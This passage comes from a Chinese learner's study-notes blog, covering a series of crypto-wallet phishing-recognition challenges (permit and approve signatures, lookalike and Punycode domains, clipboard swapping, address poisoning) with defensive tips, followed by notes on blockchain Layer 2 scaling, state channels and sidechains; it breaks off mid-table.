和 <code>spender</code>）。</li><li><strong>过期时间失效</strong>：若 <code>deadline</code> 过长，签名可能被重复使用（建议设置较短有效期）。</li></ul></blockquote><p>我的理解就是 授权第三方合约使用自己的代币，然后可以省去gas费用</p><p>这个签名将允许攻击者控制您的 USDC 代币！通过使用 EIP-2612 permit 签名，攻击者可以：</p><ul><li>获得对您所有 USDC 的完全访问权限</li><li>在未来任何时间转移您的代币</li><li>无需您进一步批准即可花费您的资金</li></ul><p>安全检查要点</p><ul><li><p>检查 Permit 类型，了解授权范围</p></li><li><p>验证 Spender 地址是否为可信来源</p></li><li><p>注意授权金额，警惕无限制授权</p></li><li><p>确认网站来源的可信度</p></li></ul><p>所以此处不能进行授权</p><h3 id="No-0x0004-专属代币空投"><a href="#No-0x0004-专属代币空投" class="headerlink" title="No.0x0004 专属代币空投"></a>No.0x0004 专属代币空投</h3><p>此交易实际上是向合约 0xbe535a82f2c3895bdaceb3ffe6b9b80ac2f832a0 发送 0.5 ETH，而不是领取任何代币。</p><p>函数选择器 0x5fba79f5 调用了一个名为 SecurityUpdate() 的函数，该函数可能会将您的资金转移给攻击者。</p><p><strong>在真实情况下，永远不要在不了解交易内容的情况下签署交易！</strong></p><h3 id="No-0x0005-USDT-授权钓鱼模拟"><a href="#No-0x0005-USDT-授权钓鱼模拟" class="headerlink" title="No.0x0005 USDT 授权钓鱼模拟"></a>No.0x0005 USDT 授权钓鱼模拟</h3><p>挑战：请小心真实的授权请求</p><p> <strong>授权风险提示：</strong></p><ul><li>除了 approve 外，也要当心 increaseAllowance 函数</li><li>increaseAllowance 同样可以增加代币授权额度</li><li>一些钓鱼网站会通过这个方式来掩饰其真实意图</li></ul><p>💡 安全建议：永远不要给不明来源的网站无限授权！</p><blockquote><p><code>increaseAllowance</code> 是 <strong>ERC-20 代币标准</strong> 中的一个扩展函数，用于<strong>安全地增加</strong>某个地址（<code>spender</code>）的代币授权额度。它是对传统 <code>approve</code> 方法的改进，旨在避免潜在的安全风险（如前端竞态条件攻击）。</p><p> <strong>传统 <code>approve</code> 的问题</strong></p><ul><li><p><strong>竞态条件（Race Condition）</strong><br>  如果用户连续发起两笔 <code>approve</code> 交易（例如先授权 100，再改为 200），矿工可能以相反顺序打包交易，导致最终授权额度被意外覆盖（变成 100 而非 200）。</p><p>  solidity</p>  <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// 危险操作：可能被覆盖</span><br><span class="line">approve(spender, 100);  // 交易1</span><br><span class="line">approve(spender, 200);  // 交易2</span><br></pre></td></tr></tbody></table></figure></li></ul><p> <strong><code>increaseAllowance</code> 的解决方案</strong></p><p>✅ <strong>增量调整</strong>：基于当前授权额度增加数值，而非直接覆盖。<br>✅ <strong>安全操作</strong>：避免竞态条件，适合前端交互。</p></blockquote><h3 id="No-0x0006-假冒代币空投钓鱼攻击"><a href="#No-0x0006-假冒代币空投钓鱼攻击" class="headerlink" title="No.0x0006 假冒代币空投钓鱼攻击"></a>No.0x0006 假冒代币空投钓鱼攻击</h3><p>挑战：识别真假域名</p><ul><li>场景描述</li></ul><p>某天，你收到一封电子邮件，声称你有资格获得UNI代币的空投！邮件中包含一个链接，引导你到一个看似合法的网站。你点击了该链接，并看到以下交易记录：</p><img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-05%20144514.png" style="zoom:67%;"><p>仔细观察上面的交易记录。这种钓鱼攻击通常利用视觉上相似的字符（如用数字”1”替代字母”i”）来欺骗用户。</p><p><strong>安全建议</strong></p><ul><li>始终逐字符检查域名</li><li>警惕使用数字代替字母的域名（例如，用’1’代替’i’）</li><li>收藏官方网站而不是点击电子邮件中的链接</li><li>使用密码管理器，它只会在合法域名上自动填充</li><li>安装警告钓鱼网站的浏览器扩展</li></ul><h3 id="No-0x0007-超高收益质押平台"><a href="#No-0x0007-超高收益质押平台" class="headerlink" title="No.0x0007 超高收益质押平台"></a>No.0x0007 超高收益质押平台</h3><p>挑战：了解如何识别可疑的质押合约</p><p>某些可疑的质押合约可能会引导您进行 <strong>approve</strong> 授权，表面上看似只为了质押特定金额，实际上却请求对整个代币余额的完全访问权限。一旦授权成功，攻击者即可任意转走您的所有资产。</p><img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-05%20145026.png" style="zoom:67%;"><p>如上图，存在approve方法需要谨慎！！</p><blockquote><p><code>approve</code> 是 <strong>ERC-20 代币标准</strong> 中的一个核心方法，用于授权另一个地址（通常是智能合约）代表你支配一定数量的代币。它是 DeFi（去中心化金融）交互的基础，但错误使用可能导致资金风险。</p></blockquote><h3 id="No-0x0008-Telegram-代币钓鱼挑战"><a href="#No-0x0008-Telegram-代币钓鱼挑战" class="headerlink" title="No.0x0008 Telegram 代币钓鱼挑战"></a>No.0x0008 Telegram 代币钓鱼挑战</h3><p>挑战：学习识别和避免 Telegram 上的助记词钓鱼攻击</p><p>风险点依旧是提供助记词，所以千万不要给别人提供自己钱包的助记词！！！</p><img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-05%20145933.png" style="zoom:67%;"><h3 id="No-0x0009-Punycode-钓鱼攻击"><a href="#No-0x0009-Punycode-钓鱼攻击" class="headerlink" title="No.0x0009 Punycode 钓鱼攻击"></a>No.0x0009 Punycode 钓鱼攻击</h3><p>挑战：识别 Punycode 钓鱼域名</p><ul><li>场景描述</li></ul><p>您收到一封电子邮件，声称是来自 Trezor（一个知名的硬件钱包品牌）的重要安全更新通知。电子邮件中的链接看起来像是指向官方 Trezor 网站，但实际上是一个精心伪装的钓鱼网站。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">trẹzor.com</span><br><span class="line">看起来像正常的 Trezor 域名</span><br></pre></td></tr></tbody></table></figure><blockquote><h4 id="什么是-Punycode？"><a href="#什么是-Punycode？" class="headerlink" title="什么是 Punycode？"></a>什么是 Punycode？</h4><p>Punycode 是一种编码系统，允许将非 ASCII 字符（如西里尔字母、中文等）转换为 ASCII 字符，以便在域名系统中使用。攻击者经常利用视觉上相似的字符创建看似合法的域名。 例如，某些特殊字符看起来与拉丁字母几乎相同，但它们是不同的字符： 你可以使用 <a href="https://www.punycoder.com/">Punycoder</a> 来转换 Unicode 和 Punycode 域名。</p><table><thead><tr><th align="left">显示域名</th><th align="left">实际 Punycode 域名</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">trẹzor.com</td><td align="left">xn–trzor-o51b.com</td><td align="left">使用特殊字符替换了某些字母</td></tr></tbody></table></blockquote><p>所以 trezor的官方域名应该为trezor.io</p><p>防御方式：</p><ul><li>直接在浏览器中输入已知的官方网址，而不是点击电子邮件中的链接</li><li>使用书签保存常用的重要网站</li><li>安装可以检测 Punycode 域名的浏览器扩展</li><li>注意域名中不寻常的字符或拼写</li></ul><h3 id="No-0x0010-剪贴板钓鱼挑战"><a href="#No-0x0010-剪贴板钓鱼挑战" class="headerlink" title="No.0x0010 剪贴板钓鱼挑战"></a>No.0x0010 剪贴板钓鱼挑战</h3><p>挑战：识别剪贴板型钓鱼攻击</p><ul><li>场景描述</li></ul><p>您需要转账 1 ETH 到朋友的钱包。他们已经分享了他们的钱包地址，您正在使用加密货币转账界面进行转账。</p><img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-05%20150754.png" style="zoom:50%;"><p>复制粘贴之后，发现钱包地址与之前的不同了</p><ul><li>攻击原理：</li></ul><ol><li>攻击者创建一个看似合法的网站</li><li>当你点击”复制”按钮时，恶意JavaScript代码会秘密替换复制的地址</li><li>如果粘贴后没有验证地址，你可能会将资金发送给攻击者</li></ol><ul><li><p>防御方式：</p><ul><li><p>粘贴后务必再次检查地址</p></li><li><p>考虑使用带有地址验证的硬件钱包</p></li><li><p>在电脑上复制敏感信息（如钱包地址）时要特别小心 - 即使使用Ctrl+C，恶意软件也可能篡改你的剪贴板内容</p></li></ul></li></ul><h3 id="No-0x0011-Google-搜索广告钓鱼攻击"><a href="#No-0x0011-Google-搜索广告钓鱼攻击" class="headerlink" title="No.0x0011 Google 搜索广告钓鱼攻击"></a>No.0x0011 Google 搜索广告钓鱼攻击</h3><p>挑战：识别 Google 搜索广告钓鱼</p><ul><li>场景描述</li></ul><p>您想要使用 Lido Finance 质押 ETH。在 Google 上搜索”Lido Finance”时看到这些结果。您能识别出哪个是合法网站，哪个是钓鱼网站吗？</p><img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-05%20151348.png" style="zoom:67%;"><p>看第一条的左上角有一个Ad，是广告的意思，怀疑是钓鱼网站</p><p>辨别网站真伪的方法：</p><ul><li>攻击者经常购买与热门加密货币项目相关的 Google 广告，这些广告会出现在搜索结果的顶部，标记为”赞助”或”广告”。</li><li>这些广告通常使用与官方网站非常相似的域名，但有细微的差别，例如：<ul><li>使用不同的顶级域名（如用 .is 代替 .fi）</li><li>在域名中添加或删除字母</li><li>使用连字符或用数字替换字母</li><li>当用户点击这些广告时，他们会被引导到看起来与官方网站完全相同的钓鱼网站，这些网站旨在窃取资金或私钥。</li></ul></li></ul><h3 id="No-0x0012-Microsoft-Teams-钓鱼攻击"><a href="#No-0x0012-Microsoft-Teams-钓鱼攻击" class="headerlink" title="No.0x0012 Microsoft Teams 钓鱼攻击"></a>No.0x0012 Microsoft Teams 钓鱼攻击</h3><p>本页面模拟攻击者如何创建虚假的 Microsoft Teams 网站来分发恶意软件和窃取敏感信息。</p><img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-05%20151843.png" style="zoom:67%;"><p>本示例中的钓鱼指标</p><ul><li><strong>可疑 URL</strong>：注意域名是 “microsoft-meet.com” 而不是 “teams.microsoft.com”</li><li><strong>简化界面</strong>：与真实的 Teams 登录相比，虚假页面具有简化的界面</li><li><strong>缺乏安全功能</strong>：缺少 Microsoft 通常包含的安全元素</li><li><strong>加入按钮</strong>：突出的 “在 Teams 应用程序中加入” 按钮可能会导致恶意软件下载</li></ul><p>安全提示</p><ul><li>在输入凭据或下载软件之前，始终验证 URL。</li><li>仅从官方 Microsoft 网站或应用商店下载 Microsoft Teams。</li><li>对任何异常的安装过程或请求保持警惕。</li><li>如果您下载了可疑的软件包，可以在打开之前使用 <a href="https://www.virustotal.com/">VirusTotal.com</a> 进行扫描。但请注意，即使没有检测到威胁（0 检测），也不能保证绝对安全。</li></ul><blockquote><h2 id="Microsoft-Teams-钓鱼攻击的工作原理"><a href="#Microsoft-Teams-钓鱼攻击的工作原理" class="headerlink" title="Microsoft Teams 钓鱼攻击的工作原理"></a>Microsoft Teams 钓鱼攻击的工作原理</h2><p>攻击者创建令人信服的 Microsoft Teams 登录页面或更新通知的复制品，诱骗用户下载恶意软件或泄露其凭据。这些攻击变得越来越复杂，针对个人和组织。</p><p>风险1：数据泄露</p><p>通过虚假 Teams 更新安装的恶意软件可以访问您设备上的敏感文件，可能导致未经授权访问个人和公司数据。这可能导致知识产权盗窃、机密信息泄露和合规违规。</p><p>风险2：凭据盗窃</p><p>当用户在虚假 Teams 网站上输入其 Microsoft 凭据时，攻击者会捕获这些信息以获取对电子邮件、OneDrive、SharePoint 和其他 Microsoft 365 服务的访问权限。这可能导致账户被接管并进一步危及组织资源。</p><p>风险3：钱包资金耗尽</p><p>对于从同一设备访问加密货币钱包或金融服务的用户，通过虚假 Teams 更新安装的恶意软件可能包含扫描钱包凭据的功能，导致数字资产被盗。</p></blockquote><h3 id="No-0x0037-虚假扩展程序钓鱼"><a href="#No-0x0037-虚假扩展程序钓鱼" class="headerlink" title="No.0x0037 虚假扩展程序钓鱼"></a>No.0x0037 虚假扩展程序钓鱼</h3><p>挑战：识别出虚假扩展程序</p><img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-05%20155308.png" style="zoom: 50%;"><p>扩展程序安全最佳实践：</p><ul><li>始终从官方网站下载：直接访问官方网站（例如 metamask.io），而不是在扩展商店中搜索。虚假或恶意扩展程序可能出现在搜索结果中，甚至出现在官方扩展商店中，有时会模仿真实扩展程序的名称、图标或品牌。通过访问官方网站，您可以确保获得正宗、安全的版本，避免落入可能危及您安全和资产的仿冒或诈骗列表的陷阱。</li><li>检查用户数量和评论：官方扩展程序拥有大量用户和普遍积极的评论</li><li>仔细阅读权限：只授予必要的权限</li><li>保持扩展程序更新：定期更新通常包含安全补丁</li><li>删除未使用的扩展程序：通过删除不再使用的扩展程序来减少攻击面</li></ul><h3 id="中级"><a href="#中级" class="headerlink" title="中级"></a>中级</h3><h3 id="No-0x0013-TransferFrom-零值转账钓鱼挑战"><a href="#No-0x0013-TransferFrom-零值转账钓鱼挑战" class="headerlink" title="No.0x0013 TransferFrom 零值转账钓鱼挑战"></a>No.0x0013 TransferFrom 零值转账钓鱼挑战</h3><p>挑战：学习识别和避免零值转账诈骗</p><p><img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-05%20153732.png"></p><p>发现我的钱包地址和发送方发送到接收方的地址不同</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">我的钱包：   0x1234ab7890123456781232345678901234567890</span><br><span class="line">发送方的发送到的地址：0x1234ab789012345678abc2345678901234567890</span><br></pre></td></tr></tbody></table></figure><p>诈骗者经常使用零值转账来创建与伪造地址的虚假交易历史，让受害者以为该地址为可信地址，从而做到地址混淆，让受害者向攻击方地址进行转账。</p><p>如何保护自己：</p><ul><li><strong>始终验证完整地址</strong>，而不仅仅是开头和结尾</li><li>警惕看起来与您之前交互过的地址相似的地址</li><li>仔细检查交易历史，包括零值转账</li><li>使用钱包的地址簿功能标记可信地址</li><li>考虑使用带有地址验证功能的硬件钱包</li></ul><blockquote><h3 id="诈骗者利用“零值转账”伪造交易历史的原理及防范措施"><a href="#诈骗者利用“零值转账”伪造交易历史的原理及防范措施" class="headerlink" title="诈骗者利用“零值转账”伪造交易历史的原理及防范措施"></a><strong>诈骗者利用“零值转账”伪造交易历史的原理及防范措施</strong></h3><h4 id="1-攻击原理"><a href="#1-攻击原理" class="headerlink" title="1. 攻击原理"></a><strong>1. 攻击原理</strong></h4><p>诈骗者通过发送 <strong>零值转账（0 ETH 或 0 代币）</strong> 到 <strong>伪造地址</strong>，目的是在区块链浏览器（如 Etherscan）上制造虚假的交易历史，诱导受害者误认为该地址是可信的。具体手法如下：</p><ul><li><strong>伪造交易历史</strong>：<br>  攻击者向目标地址（如 <code>0x123...abc</code>）发送多笔 <code>0 ETH</code> 转账，使该地址在 Etherscan 上显示与“知名地址”（如交易所、项目方）有交互记录。<ul><li>例如：攻击者可能伪造一个与 <strong>Uniswap 路由合约</strong> 相似的地址，并提前用零值转账制造“活跃记录”。</li></ul></li><li><strong>地址混淆（Address Poisoning）</strong>：<br>  攻击者生成一个与受害者常用地址 <strong>开头和结尾相似</strong> 的地址（如 <code>0x1234...5678</code> vs <code>0x1234...9876</code>），并发送零值转账，使受害者在复制粘贴时误选错误地址。</li><li><strong>诱导转账</strong>：<br>  当受害者看到该地址有“历史交易”时，可能误以为是合法地址，从而将资金转入诈骗者的钱包。</li></ul></blockquote><h1 id="8月6日"><a href="#8月6日" class="headerlink" title="8月6日"></a>8月6日</h1><table><thead><tr><th>今日学习内容</th></tr></thead><tbody><tr><td>MyFirstLayer2 部分学习</td></tr><tr><td>区块链岗位全景图</td></tr></tbody></table><h2 id="MyFirstLayer2"><a href="#MyFirstLayer2" class="headerlink" title="MyFirstLayer2"></a>MyFirstLayer2</h2><h3 id="1-公链瓶颈"><a href="#1-公链瓶颈" class="headerlink" title="1 公链瓶颈"></a>1 公链瓶颈</h3><h4 id="1-1改进尝试"><a href="#1-1改进尝试" class="headerlink" title="1.1改进尝试"></a>1.1改进尝试</h4><p>为了保证参与门槛足够低，比特币将全网同步的出块时间控制在 10 分钟，平均 TPS （每秒可处理交易笔数）仅有个位数。以太坊出块时间约 12 秒，平均 TPS 也仅有十几笔。这对比于传统 Web2 的经济活动来说，远远不够用</p><p>提高区块链性能的两个尝试：</p><ul><li><p><u>增大单个区块的大小，容纳更多的交易</u></p><p>  这样做会引起区块账本的快速膨胀，参与验证的机器性能要求越来越高，提高了参与门槛，导致整个网络去中心化程度和安全性渐渐降低。从 BTC 分叉出来的 BCH（Bitcoin Cash） 将区块大小从 1MB 提升至 32MB，BSV（Bitcoin Satoshi’s Vision） 则是更激进地取消了区块大小上限，允许无限多的信息融入一个区块。</p></li><li><p><u>降低出块的时间，追求一定时间内出更多的块来处理更多的交易</u></p><p>  这样对节点的网络条件提出了更高要求，提高了参与门槛。并且影响了全网数据同步的稳定性，因为物理上相隔较远的节点集群容易对最新的区块产生分歧，导致分叉。分叉链总需要竞争出新的最长链，抛弃其中的一条分支，导致过去一段时间内的许多交易被重写，这就是“区块重组”现象，Polygon 在 2023 年发生过 157 个区块的重组事件。</p></li></ul><p>此外，还有一些公链试图用更激进的方式改善性能：</p><ul><li><p><u>使用数量更少的超级节点通讯：</u></p><p>  超级节点的性能更强大，网络带宽更好更稳定，因此彼此之间能实现超高速的通讯，但这显然降低了去中心化程度。如 Fanton 有 51 个共识节点，BSC、EOS、TRON 则仅有 21 个超级节点。</p></li><li><p><u>用特殊的共识机制提升性能：</u></p><p>  共识机制决定了全网节点对出块方式如何达成共识，一些特殊的机制也许可以提高出块速度，但共识机制越复杂，就对机器性能要求越高，也更容易出现单点故障导致整个系统出错。如 Solana，全网节点依赖随机选出的单个 Leader 节点来协调，因此获得了极高的理论 TPS 上限，但对节点性能要求变得非常高，并多次发生全网宕机的安全性事故。</p></li></ul><p>目前高性能公链的探索成果，普遍获得了将 TPS 提升至 100 ~ 1000 的成绩，但共识节点数量也降低为几十个至一千多个不等。对比于以太坊分布全球的近万个共识节点 ，高性能公链在性能提高了一两个数量级的同时，去中心化程度也下降了一两个数量级。</p><h4 id="1-2-区块链三难困境"><a href="#1-2-区块链三难困境" class="headerlink" title="1.2 区块链三难困境"></a>1.2 区块链三难困境</h4><p>由于区块链的底层特性，存在一个不可能三角悖论。区块链不可能三角（Blockchain Trilemma）是指在设计区块链系统时，存在三个目标之间的矛盾，这三个目标分别是去中心化、安全性和可扩展性（性能）</p><ol><li><strong>去中心化</strong>（Decentralization）：指的是在区块链系统中，所有的节点都具有相同的权力，没有单一的中心化权威节点进行控制。这个目标是区块链的核心特性，也是保证系统安全性和抗攻击性的基础。</li><li><strong>安全性</strong>（Security）：指的是在区块链系统中，保证交易的真实性、完整性、不可篡改性和抗攻击性等方面的安全。这个目标是区块链系统的重要保障，也是确保系统可靠性和信任度的基础。</li><li><strong>可扩展性</strong>（Scalability）：可扩展性即性能，指的是在区块链系统中，支持足够大量的交易、节点和用户等系统扩展。这个目标是区块链系统的重要需求，也是确保系统能够满足现实需求的基础。</li></ol><p>这三个目标之间存在矛盾关系。例如，在追求更高的去中心化的情况下，需要所有节点都保存完整的区块链数据，但是这会导致系统的可扩展性降低。相反，在追求更高的可扩展性的情况下，需要牺牲一定的去中心化；还比如采用分片技术 [1] 来扩容，但是可能导致节点同步数据困难，更容易发生故障，导致安全性降低。</p><p><strong>高安全性和高可扩展性</strong></p><p>追求安全性和可扩展性（即性能），往往采用少数超级节点进行通讯，超级节点拥有更强的性能和更好的网络环境，彼此之间能实现超高速的通讯。但参与门槛过高，牺牲了去中心化程度。</p><p>代表区块链：BSC、EOS、TRON 等区块链采用了少数高性能节点维护网络，仅有 21 个超级节点进行记账。</p><p><strong>高可扩展性和高去中心化</strong></p><p>追求可扩展性（即性能）和去中心化程度，为保证去中心化采用了较多验证节点，为了追求性能提高了出块速度，或采用了特殊的共识机制。但提高出块速度容易导致大规模区块重组，更复杂的共识机制容易导致全网宕机等安全事故，牺牲了安全性。</p><p>代表区块链：Polygon 在 2023 年发生了 157 个区块的大规模重组；Solana 多次出现全网宕机的事故。</p><p><strong>高去中心化和高安全性</strong></p><p>追求去中心化程度和安全性，采用更多的节点和更公平的出块方式，值得信赖。但为了允许低性能节点参与验证，协调全球网络延迟，导致每秒可处理的交易数较低，牺牲了性能。</p><p>代表区块链：BTC、ETH 追求了极致的安全可靠和去中心化，但处理交易的速度较低，BTC 约为 7 笔/秒，ETH 约为 10 - 20 笔/秒。</p><h4 id="1-3-Layer-2"><a href="#1-3-Layer-2" class="headerlink" title="1.3 Layer 2"></a>1.3 Layer 2</h4><p>事实上，有一种方法可以克服区块链三难困境。而工程实践上，我们可以通过增加层级的方式来优化三者的矛盾，增加层级实现了业务解耦，降低了原先层级的负担。</p><p>增加第二层网络（Layer 2 ），来分摊一层网络（Layer 1）的负担，达到扩容的目的。</p><blockquote><p>Layer 2 即二层网络，是在一层网络的基础上搭建的，用各种技术手段帮助底层公链扩容的解决方案</p></blockquote><h3 id="2-Layer-2发展史"><a href="#2-Layer-2发展史" class="headerlink" title="2 Layer 2发展史"></a>2 Layer 2发展史</h3><h4 id="2-1-状态通道（State-channel）"><a href="#2-1-状态通道（State-channel）" class="headerlink" title="2.1 状态通道（State channel）"></a>2.1 状态通道（State channel）</h4><blockquote><p>假设 Alice 经常在一家咖啡店消费，如果每次买一杯 5 美元的咖啡，都需要支付 0.5 美元的手续费，这也太痛苦了。那么假如 Alice 和咖啡店能达成共识，每次买咖啡时付给咖啡店一张签了名的欠条，一段时间后咖啡店攒了足够多的欠条，将欠条算好总金额一次性兑现，这样交易成本就可以大幅降低，对双方都有利。这种思路就是最早的二层网络，也就是状态通道的原理。</p></blockquote><p><strong>状态通道</strong> 是一种区块链扩容技术，允许用户在链下进行高频、低成本的交互，仅在开启和关闭通道时与区块链交互，从而实现近乎即时、零摩擦的交易。状态通道使用了<strong>多签技术</strong> [1]，允许两个个体之间提前存入一笔资金锁定在智能合约中，建立一个内部通道，然后双方可以在通道内进行多笔小额转账，速度极快，成本极低，再在一段时间后用转账证明一次性提款。状态通道也是比特币的 Lightning Network（闪电网络），以太坊的 Raiden Network（雷电网络）背后的底层技术。</p><blockquote><p>[1] 多签技术（Multi-sig）：即多重签名技术，是指需要多个授权方共同授权才能完成交易，提高了交易的安全性和可靠性。如公司财库的资金要求三人之中的至少两人签名（2/3）才能动用，状态通道中则要求同时拥有双方的签名（2/2）才能生效，多签也允许出现更多 n/m 的授权条件。</p></blockquote><blockquote><p><strong>1. 核心原理</strong></p><p> <strong>(1) 基本流程</strong></p><ol><li><strong>开启通道</strong>：<ul><li>双方将资金锁定在链上的智能合约中（如存入 10 ETH）。</li><li>生成初始状态（如 Alice: 6 ETH，Bob: 4 ETH），并签名确认。</li></ul></li><li><strong>链下交易</strong>：<ul><li>双方通过签名消息更新状态（如 Alice 转 1 ETH 给 Bob → Alice:5, Bob:5）。</li><li><strong>无需矿工/验证者</strong>，交易即时生效。</li></ul></li><li><strong>关闭通道</strong>：<ul><li>将最终状态提交到链上，合约根据最新状态分配资金。</li><li>若有争议（如一方提交过期状态），可挑战并惩罚作弊者。</li></ul></li></ol><p><strong>(2) 技术关键点</strong></p><ul><li><strong>多签名验证</strong>：每次状态更新需双方签名。</li><li><strong>时间锁（Timelock）</strong>：防止旧状态被恶意提交。</li><li><strong>欺诈证明（Fraud Proof）</strong>：允许诚实方在争议期举证。</li></ul><p><strong>2. 为什么需要状态通道？</strong></p><table><thead><tr><th align="center"><strong>问题</strong></th><th align="center"><strong>状态通道解决方案</strong></th></tr></thead><tbody><tr><td align="center">链上交易慢且昂贵</td><td align="center">链下交易零成本，即时确认</td></tr><tr><td align="center">区块链吞吐量有限</td><td align="center">支持无限次链下交互</td></tr><tr><td align="center">隐私性差</td><td align="center">交易细节仅在参与者间传递</td></tr></tbody></table><hr><p><strong>3. 典型应用场景</strong></p><p> <strong>(1) 高频微支付</strong></p><ul><li><strong>案例</strong>：<ul><li>按秒计费的视频流服务（如每小时支付 0.001 ETH）。</li><li>游戏内道具实时交易。</li></ul></li></ul><p> <strong>(2) 链下投票与治理</strong></p><ul><li><strong>案例</strong>：<ul><li>DAO 成员在通道内频繁投票，最终结果上链。</li></ul></li></ul><p><strong>(3) 隐私保护交易</strong></p><ul><li><strong>案例</strong>：<ul><li>双方链下协商价格，仅公开最终交易。</li></ul></li></ul><p><strong>4.优缺点</strong></p><p> <strong>✅ 优点</strong></p><ul><li><strong>零延迟</strong>：交易即时完成。</li><li><strong>零 Gas 费</strong>：链下交互无需付费。</li><li><strong>隐私性</strong>：交易细节不上链。</li></ul><p><strong>❌ 缺点</strong></p><ul><li><strong>通道管理复杂</strong>：需预先锁定资金。</li><li><strong>适用性有限</strong>：仅适合固定参与者间的交互。</li><li><strong>流动性要求</strong>：长期占用资金。</li></ul></blockquote><p>状态通道技术本质上是使用了<strong>中心化的节点</strong>，用户在链上质押一笔较大额的资金，然后在链下用签了名的“欠条”进行付款，积攒了一定量的“欠条”之后，任何一方都可以选择关闭通道进行结算。链上的智能合约只认可同时拥有双方签名的转账信息，Alice 和咖啡店都拥有自己的签名，再加上“欠条”上对方的签名，才能凑齐签名<strong>通过多签验证</strong>，因此无法提取不属于自己的资金。</p><p>但这样做产生了 2 个新的问题：</p><ol><li>Alice 和咖啡店之间攒“欠条”的约定仅适合于最简单的转账交易，去中心化金融要实现的交易比转账复杂得多，那么<strong>想要实现更复杂的交易要怎么办呢</strong>？为了解决这个问题，引出了<strong>侧链</strong>方案。</li><li>Alice 可以给咖啡店发送资金，若超市与咖啡店有通道，也可以借助咖啡店向超市发送资金，但是<strong>如何给未参与雷电网络的个体发送资金呢</strong>？这个问题，则引出了 <strong>Plasma</strong> 方案。</li></ol><h4 id="2-2-侧链（Sidechain）"><a href="#2-2-侧链（Sidechain）" class="headerlink" title="2.2 侧链（Sidechain）"></a>2.2 侧链（Sidechain）</h4><p>为了解决<strong>状态通道无法执行复杂交易</strong>的问题，侧链方案进入人们视野。</p><p><strong>侧链</strong>可以理解为一条相对独立的区块链，它们往往采用与主链（一般是以太坊）类似的架构，方便主链上的项目迁移至侧链。</p><p>我们可以在主链的智能合约内锁定一定量的资产，然后在侧链上铸造等量资产，实现“原子交换”。用这种方式将资产存入侧链，在侧链上进行各种交易，然后在必要时转移回主链。</p><p><strong>侧链核心特性</strong></p><table><thead><tr><th align="center"><strong>特性</strong></th><th align="center"><strong>说明</strong></th></tr></thead><tbody><tr><td align="center"><strong>独立性</strong></td><td align="center">拥有自己的共识机制（如 PoA、PoS）、区块参数和智能合约。</td></tr><tr><td align="center"><strong>双向锚定</strong></td><td align="center">资产可从主链锁定后映射到侧链，也能反向返回。</td></tr><tr><td align="center"><strong>互操作性</strong></td><td align="center">通过桥接协议（Bridge）与主链通信。</td></tr><tr><td align="center"><strong>定制化</strong></td><td align="center">可针对特定需求优化（如高TPS、低Gas费、隐私增强）。</td></tr></tbody></table><p>侧链会进行一定的定制化，获得更高的性能，帮助主链分担交易压力。</p><ul><li>采用 <strong>POS</strong> 共识机制（Proof of Stake），大幅提高了出块速度以达到扩容的目的。如 Polygon 侧链，将出块时间缩短至 2 秒。</li><li>采用 <strong>POA</strong> 共识机制（Proof of Authority），用更少的经过授权的超级节点进行通信，以实现侧链上的超高性能。如负责游戏资产交易的 Ronin 侧链，因游戏内的 NFT 资产本就比较中心化，所以这种更中心化的方案也可以接受。</li></ul><p><strong>侧链的工作原理</strong></p><p><strong>(1) 资产跨链流程（以以太坊 ↔ Polygon 为例）</strong></p><ol><li><strong>存款（主链 → 侧链）</strong><ul><li>用户将 ETH 存入主链的桥合约，合约锁定资产并生成证明。</li><li>侧链验证证明后，在侧链上 mint 等量的封装资产（如 WETH）。</li></ul></li><li><strong>提款（侧链 → 主链）</strong><ul><li>用户销毁侧链的 WETH，提交销毁证明到主链桥合约。</li><li>主链合约验证后解锁原始 ETH。</li></ul></li></ol><p><strong>(2) 共识机制差异</strong></p><ul><li><strong>主链</strong>：通常采用高安全共识（如以太坊的 PoS）。</li><li><strong>侧链</strong>：可能使用更高效的共识（如 Polygon PoS 链的 Bor 共识）。</li></ul><p><strong>为什么需要侧链？</strong></p><table><thead><tr><th align="center"><strong>主链瓶颈</strong></th><th align="center"><strong>侧链解决方案</strong></th></tr></thead><tbody><tr><td align="center">低TPS（如以太坊15 TPS）</td><td align="center">侧链可达数千 TPS（如 Polygon 7,000 TPS）。</td></tr><tr><td align="center">高Gas费</td><td align="center">侧链交易成本极低（如 BSC 的 $0.01 交易费）。</td></tr><tr><td align="center">功能限制</td><td align="center">侧链可定制模块（如隐私交易、游戏专用链）。</td></tr></tbody></table><p> <strong>典型侧链项目</strong></p><table><thead><tr><th align="center"><strong>侧链</strong></th><th align="center"><strong>锚定主链</strong></th><th align="center"><strong>特点</strong></th><th align="center"><strong>用例</strong></th></tr></thead><tbody><tr><td align="center"><strong>Polygon PoS</strong></td><td align="center">以太坊</td><td align="center">高TPS，EVM兼容</td><td align="center">DeFi、NFT</td></tr><tr><td align="center"><strong>Gnosis Chain</strong></td><td align="center">以太坊</td><td align="center">注重去中心化，xDai 合并</td><td 